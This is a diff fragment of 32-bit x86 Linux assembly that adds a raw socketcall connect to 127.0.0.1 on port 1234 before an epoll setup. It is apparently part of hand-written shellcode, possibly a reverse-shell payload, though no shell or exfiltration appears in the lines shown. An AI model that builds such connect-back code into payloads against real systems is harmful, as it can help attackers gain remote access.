@@ -181,6 +181,19 @@ connect:
       int    0x80
       mov    [ebp+s], eax
 
+      push   0x0100007f        ; sa.sin_addr=127.0.0.1
+      push   0xD2040002        ; sa.sin_port=htons(1234), sa.sin_family=AF_INET
+      mov    ecx, esp
+      
+      ; connect (s, &sa, sizeof(sa));    
+      push   0x10              ; sizeof(sa)      
+      push   ecx               ; &sa
+      push   ebx               ; sockfd
+      mov    ecx, esp          ; &args
+      push   3
+      pop    ebx               ; ebx=sys_connect
+      int    0x80
+    
       ; efd = epoll_create1(0);
       mov    eax, SYS_epoll_create1
       xor    ebx, ebx
